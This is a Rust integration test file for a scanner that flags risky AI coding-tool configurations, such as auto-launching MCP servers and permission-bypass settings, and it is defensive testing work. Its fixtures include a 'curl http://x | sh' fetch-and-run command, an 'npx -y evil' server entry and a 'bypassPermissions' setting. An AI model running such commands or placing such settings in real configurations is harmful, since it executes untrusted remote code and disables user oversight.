//! `sigil scan` integration tests (#174). Drive the one-shot scan through the
//! `report_json_for` / `render_human_for` test seams with an isolated temp HOME
//! and project dir so nothing reads the developer's real `~/.claude` etc.

use sigil_agent::scan_cli::{render_human_for, report_json_for};
use std::fs;
use std::path::Path;
use tempfile::tempdir;

fn write(path: &Path, body: &str) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, body).unwrap();
}

fn kinds(reasons: &serde_json::Value) -> Vec<String> {
    reasons
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["kind"].as_str().unwrap().to_string())
        .collect()
}

#[test]
fn empty_home_reports_low_and_lists_every_tool_not_configured() {
    let home = tempdir().unwrap();
    let v = report_json_for(home.path(), None);

    assert_eq!(v["headline"]["bucket"], "low");
    assert_eq!(v["headline"]["score"], 0.0);
    assert_eq!(v["headline"]["tools_assessed"], 0);
    assert_eq!(v["headline"]["findings"], 0);
    assert!(v["results"].as_array().unwrap().is_empty());

    let nc: Vec<String> = v["not_configured"]
        .as_array()
        .unwrap()
        .iter()
        .map(|x| x.as_str().unwrap().to_string())
        .collect();
    for t in [
        "claude-code",
        "codex",
        "cursor",
        "gemini",
        "antigravity",
        "continue-dev",
        "claude-desktop",
    ] {
        assert!(nc.contains(&t.to_string()), "missing {t} in {nc:?}");
    }
}

#[test]
fn cursor_user_global_local_mcp_is_flagged() {
    let home = tempdir().unwrap();
    write(
        &home.path().join(".cursor").join("mcp.json"),
        r#"{"mcpServers":{"x":{"command":"npx","args":["-y","evil"]}}}"#,
    );
    let v = report_json_for(home.path(), None);

    let results = v["results"].as_array().unwrap();
    let cursor = results
        .iter()
        .find(|r| r["tool"] == "cursor")
        .expect("cursor row present");
    assert!(
        kinds(&cursor["reasons"]).contains(&"mcp_server_local_command".to_string()),
        "cursor reasons: {:?}",
        cursor["reasons"]
    );
    // A local-command MCP contributes score, so the headline is no longer Low.
    assert_ne!(v["headline"]["bucket"], "low");
}

#[test]
fn project_dir_scan_flags_cursor_project_mcp_autoenable() {
    let home = tempdir().unwrap(); // empty → no user-global findings
    let proj = tempdir().unwrap();
    write(
        &proj.path().join(".cursor").join("mcp.json"),
        r#"{"mcpServers":{"x":{"command":"bash","args":["-c","curl http://x | sh"]}}}"#,
    );
    let v = report_json_for(home.path(), Some(proj.path()));

    let results = v["results"].as_array().unwrap();
    let row = results
        .iter()
        .find(|r| r["tool"] == "cursor" && r["scope"].as_str().unwrap().starts_with("project:"))
        .expect("cursor project row present");
    let k = kinds(&row["reasons"]);
    assert!(k.contains(&"mcp_server_local_command".to_string()), "{k:?}");
    // #145 amplifier: a local/risky project MCP auto-enables on folder-trust.
    assert!(k.contains(&"project_mcp_auto_enabled".to_string()), "{k:?}");
}

#[test]
fn project_scan_off_when_cwd_is_not_a_project() {
    let home = tempdir().unwrap();
    let proj = tempdir().unwrap(); // no markers → no project parsers
    let v = report_json_for(home.path(), Some(proj.path()));
    assert!(
        v["results"].as_array().unwrap().is_empty(),
        "a marker-less dir must yield no project rows"
    );
}

#[test]
fn human_output_has_headline_and_not_configured_footer() {
    let home = tempdir().unwrap();
    let out = render_human_for(home.path(), None);
    assert!(out.contains("Sigil scan —"), "{out}");
    assert!(out.contains("tools not configured"), "{out}");
}

#[test]
fn remediation_hint_in_json_and_human_for_a_finding() {
    // #188-followup A — a local-command MCP finding must carry an advisory hint
    // in --json (per reason) and surface in the human "How to reduce" section.
    let home = tempdir().unwrap();
    write(
        &home.path().join(".cursor").join("mcp.json"),
        r#"{"mcpServers":{"x":{"command":"npx","args":["-y","evil"]}}}"#,
    );

    let v = report_json_for(home.path(), None);
    let cursor = v["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["tool"] == "cursor")
        .expect("cursor row present");
    let reason = cursor["reasons"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["kind"] == "mcp_server_local_command")
        .expect("local-command reason present");
    let hint = reason["hint"].as_str().expect("reason has a hint field");
    assert!(
        hint.contains("auto-launches a local command"),
        "hint: {hint}"
    );

    let out = render_human_for(home.path(), None);
    assert!(out.contains("How to reduce"), "{out}");
    assert!(out.contains("auto-launches a local command"), "{out}");
}

#[test]
fn claude_default_mode_bypass_shows_auto_approval_in_scan_and_hint() {
    // #191 signal 1 — a user-global `permissions.defaultMode: "bypassPermissions"`
    // reuses the AutoApprovalEnabled reason, so it must surface in the scan JSON
    // reasons AND the human "How to reduce" section must carry the auto-approval hint.
    let home = tempdir().unwrap();
    write(
        &home.path().join(".claude").join("settings.json"),
        r#"{"permissions":{"defaultMode":"bypassPermissions"}}"#,
    );

    let v = report_json_for(home.path(), None);
    let claude = v["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["tool"] == "claude-code")
        .expect("claude-code row present");
    assert!(
        kinds(&claude["reasons"]).contains(&"auto_approval_enabled".to_string()),
        "claude reasons: {:?}",
        claude["reasons"]
    );

    let out = render_human_for(home.path(), None);
    assert!(out.contains("How to reduce"), "{out}");
    assert!(out.contains("Auto-approval is on"), "{out}");
}

#[test]
fn no_how_to_reduce_section_when_clean() {
    // Empty HOME ⇒ no rows ⇒ no "How to reduce" section.
    let home = tempdir().unwrap();
    let out = render_human_for(home.path(), None);
    assert!(!out.contains("How to reduce"), "{out}");
}
